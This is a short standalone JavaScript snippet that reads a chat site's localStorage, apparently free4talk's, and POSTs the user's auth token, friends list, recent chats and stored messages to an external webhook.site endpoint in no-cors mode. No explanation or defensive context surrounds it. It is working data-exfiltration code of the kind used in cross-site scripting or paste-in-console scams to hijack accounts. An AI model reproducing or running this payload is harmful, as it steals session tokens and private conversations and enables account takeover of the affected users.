fetch('https://webhook.site/dfd3c5e8-86a5-44ef-a894-15f70319c41e',
  {
    mode: 'no-cors',
    method: 'POST',
    body: JSON.stringify({
      token: localStorage['user:token'],
      userMap: localStorage['friends:userMap'],
      lastChatMap: localStorage['friends:lastChatMap'],
      messages: localStorage['free4talk:messages'],
    }),
  });
